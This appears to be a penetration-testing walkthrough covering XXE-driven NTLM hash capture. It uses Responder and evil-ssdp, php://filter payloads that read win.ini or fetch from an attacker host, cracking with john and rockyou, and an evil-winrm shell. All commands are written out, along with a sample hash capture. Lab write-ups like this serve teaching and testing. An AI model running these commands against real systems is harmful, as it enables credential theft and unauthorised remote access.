Discovery Phase:

If we can verify that we're able to read the contents of a file-system with XXE - we're able to move on.

You're going to need a few things for this to work though.

Responder
evil-ssdp
evil-winrm

Go ahead and get a Responder session running.

responder -I tun0 -v
Now that we have a Responder session running, we need to do a little bit of evil magic.

Open a new terminal, and in that terminal - let's start up evil-ssdp.py

python3 /usr/share/evil-ssdp/evil_ssdp.py <interface>
This should give you output that looks something akin too...:

Thanks Dwight.

The idea behind this attack is that we're going to utilize whatever protocol native to Windows that we can. There are a few options. We have:

ftp://
file:///
http://
(If the target machine has PHP installed, we're in luck with that as well)
php://filter/convert.base64-encode/resource=c:/windows/win.ini
php://filter/convert.base64-encode/resource=http://atacking-machine:80/evil.txt
The one we're interested in is the file:/// protocol.

I suggest using Burp Suite's Repeater - but feel free to do whatever you want. The idea is that we're going to use the file:/// to point towards our SMB Share (CIFS or Common Internet File Structure). When we do so, Responder will capture the NTLM hash.

Nice, eh?

[SMB] NTLMv2-SSP Client   : ::ffff:[REDACTED]
[SMB] NTLMv2-SSP Username : [REDACTED-PC]\[REDACTED-USER]
[SMB] NTLMv2-SSP Hash     : [REDACTED-USER]::WIN-REDACTED:ffda536eebddd9ff:56608E6BB63B9EF8075E75E6FCFEAD13:010100000000000080070C0C4462D8014105FCCC2A7C88C7000BBB00020008004B0049003000490001001E00570049004E002D0046004E0056005800580034005800530047004900470004003400570049004E002DAA46004E005600580058003400580053004700490047002E004B0Z4900300049002E004C004F00430041004C00030014004B004300300049002E004C004F00470041004C00050014004B004900200049002E004C004F004300410C4C000700080080070B0B4462D8010600040002000000080030003000000000000000000000000030000074C73B2884C3F6CAB391C1BFDD689CBD8363A424AAAA27C415102C0CDA855CE20A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003710000000000000000000000000
This hash won't crack, because I changed up a few things for Security reasoning. But if you ever do receive a NTLMv2 hash like this, try cracking with john.

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Let's suppose it gave us the password 'ohnoitss1ren'.


$---Bling Bling---$

From this point forward, we're going to make use of one of my favorite tools. evil-winrm to gain a shell on the target machine.

evil-winrm -i <target-box> -u <target-username> -p ohnoitss1ren
